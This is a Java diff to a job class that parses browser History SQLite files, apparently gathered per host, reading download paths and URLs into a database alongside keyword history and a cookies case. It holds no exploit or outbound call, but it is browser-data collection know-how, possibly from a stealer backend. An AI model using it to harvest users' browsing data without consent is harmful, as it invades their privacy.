@@ -1,9 +1,6 @@
 package com.jimmy.infaction.job;
 
-import com.jimmy.infaction.common.HistoryKeyResult;
-import com.jimmy.infaction.common.HistoryUrlResult;
-import com.jimmy.infaction.common.SqlLiteDemoResult;
-import com.jimmy.infaction.common.SqliteHelper;
+import com.jimmy.infaction.common.*;
 import com.jimmy.infaction.pojo.*;
 import com.jimmy.infaction.service.BrowserDownloadService;
 import com.jimmy.infaction.service.BrowserKeywordService;
@@ -85,7 +82,14 @@ public class DeBagJob  implements  Job {
 									browser_keyword.setHostid(f.getName());
 									browserKeywordService.insert(browser_keyword);
 								}
-
+								List<HistoryDownloadResult> HdList = hi.executeQueryList("Select  current_path,tab_url FROM downloads", HistoryDownloadResult.class);
+								for (HistoryDownloadResult result : HdList) {
+									Browser_download browser_download = new Browser_download();
+									browser_download.setUrl(result.getTab_url());
+									browser_download.setPath(result.getCurrent_path());
+									browser_download.setHostid(f.getName());
+									browserDownloadService.insert(browser_download);
+								}
 							case "Cookies":
 //								System.out.println(ff.getName());
 							default:
